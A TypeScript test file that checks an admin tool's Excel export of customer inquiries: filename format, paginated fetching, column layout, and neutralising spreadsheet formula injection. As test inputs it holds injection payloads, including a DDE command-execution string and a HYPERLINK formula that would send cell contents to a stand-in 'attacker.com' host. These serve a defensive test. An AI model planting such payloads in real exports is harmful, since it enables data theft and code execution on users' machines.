import { describe, it, expect, mock } from "bun:test";
import ExcelJS from "exceljs";
import {
  sanitizeCellValue,
  generateExportFilename,
  fetchCompleteInquiriesForExport,
  buildInquiriesWorkbook,
  type ExportInquiryItem,
} from "./admin-inquiries-export.server";

describe("Excel Export - Formula Injection Sanitization", () => {
  it("prefixes formula trigger characters (=, +, -, @, \\t, \\r, |) with an apostrophe", () => {
    expect(sanitizeCellValue("=1+1")).toBe("'=1+1");
    expect(sanitizeCellValue("=CMD|'/C calc'!A0")).toBe("'=CMD|'/C calc'!A0");
    expect(sanitizeCellValue("+628123456789")).toBe("'+628123456789");
    expect(sanitizeCellValue("-500")).toBe("'-500");
    expect(sanitizeCellValue("@SUM(A1:A10)")).toBe("'@SUM(A1:A10)");
    expect(sanitizeCellValue("\tmalicious")).toBe("'\tmalicious");
    expect(sanitizeCellValue("\rmalicious")).toBe("'\rmalicious");
    expect(sanitizeCellValue("|malicious")).toBe("'|malicious");
  });

  it("leaves standard alphanumeric and safe punctuation content untouched", () => {
    expect(sanitizeCellValue("John Doe")).toBe("John Doe");
    expect(sanitizeCellValue("PT ODE Footwear Solutions")).toBe("PT ODE Footwear Solutions");
    expect(sanitizeCellValue("buyer@brand.com")).toBe("buyer@brand.com");
    expect(sanitizeCellValue("Looking for 500 pairs of Trail Grip soles.")).toBe(
      "Looking for 500 pairs of Trail Grip soles.",
    );
    expect(sanitizeCellValue("")).toBe("");
  });

  it("handles null and undefined values safely by returning an empty string", () => {
    expect(sanitizeCellValue(null)).toBe("");
    expect(sanitizeCellValue(undefined)).toBe("");
  });

  it("safely coerces numbers and booleans into string representations", () => {
    expect(sanitizeCellValue(12345)).toBe("12345");
    expect(sanitizeCellValue(true)).toBe("true");
  });
});

describe("Excel Export - Filename Generation", () => {
  it("generates filename adhering to ode-inquiries-YYYY-MM-DD.xlsx format", () => {
    const fixedDate = new Date("2026-10-23T14:30:00Z");
    expect(generateExportFilename(fixedDate)).toBe("ode-inquiries-2026-10-23.xlsx");
  });

  it("pads single-digit months and days with leading zeros", () => {
    const janFifth = new Date("2026-01-05T08:00:00Z");
    expect(generateExportFilename(janFifth)).toBe("ode-inquiries-2026-01-05.xlsx");
  });
});

describe("Excel Export - Complete Data Retrieval & Pagination", () => {
  it("retrieves all rows within a single batch when total is less than batch size", async () => {
    const mockRows = [
      {
        id: "inq-1",
        client_name: "Alice Smith",
        company_name: "Brand A",
        email: "alice@brand-a.com",
        phone: "123456",
        message: "Sample request",
        status: "pending",
        created_at: "2026-10-20T10:00:00Z",
        outsoles: {
          id: "out-1",
          name: "Trail Grip X1",
          model_number: "TG-101",
          slug: "trail-grip-x1",
        },
      },
      {
        id: "inq-2",
        client_name: "Bob Jones",
        company_name: "Brand B",
        email: "bob@brand-b.com",
        phone: null,
        message: "General catalog question",
        status: "contacted",
        created_at: "2026-10-21T11:00:00Z",
        outsoles: null,
      },
    ];

    const mockClient = {
      from: () => ({
        select: () => ({
          order: () => ({
            range: mock((from: number, to: number) => {
              expect(from).toBe(0);
              expect(to).toBe(499);
              return Promise.resolve({ data: mockRows, error: null });
            }),
          }),
        }),
      }),
    };

    type ClientType = Parameters<typeof fetchCompleteInquiriesForExport>[0];
    const items = await fetchCompleteInquiriesForExport(mockClient as unknown as ClientType, 500);
    expect(items.length).toBe(2);
    expect(items[0]!.client_name).toBe("Alice Smith");
    expect(items[0]!.product_name).toBe("Trail Grip X1");
    expect(items[0]!.product_model).toBe("TG-101");
    expect(items[1]!.client_name).toBe("Bob Jones");
    expect(items[1]!.product_name).toBe("General Inquiry");
    expect(items[1]!.product_model).toBe("—");
  });

  it("loops across multiple pages until all records are retrieved without truncation", async () => {
    // 5 total items fetched in batches of 2 (3 calls: 2, 2, 1)
    const page1 = [
      {
        id: "1",
        client_name: "User 1",
        company_name: "Co 1",
        email: "1@c.com",
        phone: null,
        message: "m1",
        status: "pending",
        created_at: "2026-10-01",
        outsoles: null,
      },
      {
        id: "2",
        client_name: "User 2",
        company_name: "Co 2",
        email: "2@c.com",
        phone: null,
        message: "m2",
        status: "pending",
        created_at: "2026-10-02",
        outsoles: null,
      },
    ];
    const page2 = [
      {
        id: "3",
        client_name: "User 3",
        company_name: "Co 3",
        email: "3@c.com",
        phone: null,
        message: "m3",
        status: "contacted",
        created_at: "2026-10-03",
        outsoles: null,
      },
      {
        id: "4",
        client_name: "User 4",
        company_name: "Co 4",
        email: "4@c.com",
        phone: null,
        message: "m4",
        status: "resolved",
        created_at: "2026-10-04",
        outsoles: null,
      },
    ];
    const page3 = [
      {
        id: "5",
        client_name: "User 5",
        company_name: "Co 5",
        email: "5@c.com",
        phone: null,
        message: "m5",
        status: "pending",
        created_at: "2026-10-05",
        outsoles: null,
      },
    ];

    let callCount = 0;
    const mockClient = {
      from: () => ({
        select: () => ({
          order: () => ({
            range: mock((from: number, to: number) => {
              callCount++;
              if (from === 0) return Promise.resolve({ data: page1, error: null });
              if (from === 2) return Promise.resolve({ data: page2, error: null });
              if (from === 4) return Promise.resolve({ data: page3, error: null });
              return Promise.resolve({ data: [], error: null });
            }),
          }),
        }),
      }),
    };

    const items = await fetchCompleteInquiriesForExport(mockClient as unknown as ClientType, 2);
    expect(callCount).toBe(3);
    expect(items.length).toBe(5);
    expect(items.map((i) => i.id)).toEqual(["1", "2", "3", "4", "5"]);
  });

  it("handles empty database table by returning an empty array without error", async () => {
    const mockClient = {
      from: () => ({
        select: () => ({
          order: () => ({
            range: () => Promise.resolve({ data: [], error: null }),
          }),
        }),
      }),
    };

    const items = await fetchCompleteInquiriesForExport(mockClient as unknown as ClientType, 100);
    expect(items).toEqual([]);
  });

  it("throws an error when Supabase query returns an error", async () => {
    const mockClient = {
      from: () => ({
        select: () => ({
          order: () => ({
            range: () =>
              Promise.resolve({ data: null, error: { message: "Network connection refused" } }),
          }),
        }),
      }),
    };

    expect(
      fetchCompleteInquiriesForExport(mockClient as unknown as ClientType, 100),
    ).rejects.toThrow("Failed to fetch inquiries for export: Network connection refused");
  });
});

describe("Excel Export - Workbook Construction and Formatting", () => {
  it("builds a valid Excel workbook with 10 styled columns, autofilter, and frozen header", async () => {
    const testItems: ExportInquiryItem[] = [
      {
        id: "uuid-inq-1234",
        client_name: "Jane Smith",
        company_name: "Urban Footwear Co",
        email: "jane@urbanfootwear.com",
        phone: "+62 811 2233 4455",
        message: "Requesting Shore A 60 rubber sample.",
        status: "pending",
        created_at: "2026-10-23T08:30:00Z",
        product_name: "City Commuter V2",
        product_model: "CC-200",
        product_slug: "city-commuter-v2",
      },
    ];

    const workbook = buildInquiriesWorkbook(testItems);
    const buffer = await workbook.xlsx.writeBuffer();

    // Verify round-trip read of workbook
    const roundTrip = new ExcelJS.Workbook();
    await roundTrip.xlsx.load(buffer);

    const worksheet = roundTrip.getWorksheet("Sample Inquiries");
    expect(worksheet).toBeDefined();
    if (!worksheet) throw new Error("Expected worksheet to be defined");

    expect(worksheet.name).toBe("Sample Inquiries");
    expect(worksheet.rowCount).toBe(2); // 1 header row + 1 data row

    // Verify Headers
    const expectedHeaders = [
      "Inquiry Date (UTC)",
      "Status",
      "Client Name",
      "Company / Organization",
      "Email",
      "Phone",
      "Requested Product",
      "Product Model / SKU",
      "Message",
      "Inquiry ID",
    ];

    const headerRow = worksheet.getRow(1);
    for (let i = 0; i < expectedHeaders.length; i++) {
      expect(headerRow.getCell(i + 1).value).toBe(expectedHeaders[i]);
    }

    // Verify Data Row 2
    const dataRow = worksheet.getRow(2);
    expect(dataRow.getCell(2).value).toBe("Pending"); // Capitalized
    expect(dataRow.getCell(3).value).toBe("Jane Smith");
    expect(dataRow.getCell(4).value).toBe("Urban Footwear Co");
    expect(dataRow.getCell(5).value).toBe("jane@urbanfootwear.com");
    expect(dataRow.getCell(6).value).toBe("'+62 811 2233 4455"); // Sanitized leading +
    expect(dataRow.getCell(7).value).toBe("City Commuter V2");
    expect(dataRow.getCell(8).value).toBe("CC-200");
    expect(dataRow.getCell(9).value).toBe("Requesting Shore A 60 rubber sample.");
    expect(dataRow.getCell(10).value).toBe("uuid-inq-1234");

    // Verify Autofilter
    expect(worksheet.autoFilter).toBeDefined();
    expect(worksheet.autoFilter).toBe("A1:J1");
  });

  it("handles empty dataset by creating a valid spreadsheet with headers only", async () => {
    const workbook = buildInquiriesWorkbook([]);
    const buffer = await workbook.xlsx.writeBuffer();

    const roundTrip = new ExcelJS.Workbook();
    await roundTrip.xlsx.load(buffer);

    const worksheet = roundTrip.getWorksheet("Sample Inquiries");
    expect(worksheet).toBeDefined();
    if (!worksheet) throw new Error("Expected worksheet to be defined");

    expect(worksheet.rowCount).toBe(1); // Header row only
    expect(worksheet.getRow(1).getCell(1).value).toBe("Inquiry Date (UTC)");
  });

  it("properly neutralizes potential formula injection in client submitted text fields", async () => {
    const maliciousItems: ExportInquiryItem[] = [
      {
        id: "test-id",
        client_name: '=HYPERLINK("http://attacker.com?leak="&A2, "Click Me")',
        company_name: "@SUM(1+1)*cmd|' /C calc'!A0",
        email: "-10+20",
        phone: "+123456789",
        message: "=1+1",
        status: "pending",
        created_at: "2026-10-23T00:00:00Z",
        product_name: "\tTabInjectedProduct",
        product_model: "|PipedSku",
        product_slug: "test-slug",
      },
    ];

    const workbook = buildInquiriesWorkbook(maliciousItems);
    const buffer = await workbook.xlsx.writeBuffer();

    const roundTrip = new ExcelJS.Workbook();
    await roundTrip.xlsx.load(buffer);
    const worksheet = roundTrip.getWorksheet("Sample Inquiries");
    expect(worksheet).toBeDefined();
    if (!worksheet) throw new Error("Expected worksheet to be defined");

    const row = worksheet.getRow(2);

    // Every field starting with a formula character must be safely escaped
    expect(row.getCell(3).value).toBe('\'=HYPERLINK("http://attacker.com?leak="&A2, "Click Me")');
    expect(row.getCell(4).value).toBe("'@SUM(1+1)*cmd|' /C calc'!A0");
    expect(row.getCell(5).value).toBe("'-10+20");
    expect(row.getCell(6).value).toBe("'+123456789");
    expect(row.getCell(7).value).toBe("'\tTabInjectedProduct");
    expect(row.getCell(8).value).toBe("'|PipedSku");
    expect(row.getCell(9).value).toBe("'=1+1");
  });
});

describe("Excel Export - Authorization Security", () => {
  it("rejects unauthorized execution when no authenticated staff session exists", async () => {
    const { exportAdminInquiriesToExcel } = await import("./admin-inquiries.functions");
    expect(exportAdminInquiriesToExcel()).rejects.toThrow();
  });
});
